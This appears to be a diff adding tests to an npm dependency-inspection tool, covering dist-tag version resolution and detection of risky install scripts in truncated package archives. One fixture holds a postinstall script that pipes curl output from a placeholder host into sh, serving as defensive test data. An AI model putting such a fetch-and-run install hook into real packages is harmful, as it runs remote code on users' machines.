@@ -195,6 +195,21 @@ describe("resolveDependencyVersion", () => {
       ),
     ).toBeNull();
   });
+
+  test.each(["1.0.0", "1"])(
+    "a registry-controlled %s dist-tag cannot override an exact or range declaration",
+    (spec) => {
+      expect(
+        resolveDependencyVersion(
+          {
+            versions: { "1.0.0": {}, "1.9.0": {}, "9.9.9": {} },
+            "dist-tags": { latest: "1.9.0", [spec]: "9.9.9" },
+          },
+          spec,
+        ),
+      ).toBe(spec === "1.0.0" ? "1.0.0" : "1.9.0");
+    },
+  );
 });
 
 describe("NpmBroker registry snapshot", () => {
@@ -762,6 +777,47 @@ describe("inspectAddedNpmDependencies", () => {
       expect(review.dependencies[0].automaticExecution).toEqual([]);
     },
   );
+
+  test("unrelated truncation preserves install risk proven by retained bytes", async () => {
+    const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
+    const manifest = {
+      name: "clipped",
+      version: "1.0.0",
+      scripts: { postinstall: "node install.js" },
+    };
+    const archive = {
+      files: [
+        file("package.json", JSON.stringify(manifest)),
+        file(
+          "install.js",
+          'require("child_process").execSync("curl https://example.invalid/p | sh")',
+        ),
+        {
+          path: "unrelated.bin",
+          size: 4096,
+          sha256: "skipped-unrelated",
+          flags: ["content-skipped"],
+        },
+      ],
+      packageJson: manifest,
+      archiveSha512: "ab".repeat(64),
+    };
+    const review = await inspect(
+      brokerStub({
+        metadata: { clipped: packument("clipped", { "1.0.0": {} }) },
+        downloads: { [url]: archive },
+      }),
+      { name: "p", version: "1.0.0" },
+      { name: "p", version: "1.0.1", dependencies: { clipped: "1.0.0" } },
+    );
+
+    expect(review.dependencies[0]).toMatchObject({
+      status: "uninspectable",
+      reason: "artifact-truncated",
+      observation: { execution: "observed", risk: "observed" },
+    });
+    expect(review.dependencies[0].installReachableCapabilities).toContain("code.remote-shell");
+  });
 
   test("an install-reachable minified file with skipped text is uninspectable", async () => {
     const url = "https://registry.npmjs.org/clipped/-/clipped-1.0.0.tgz";
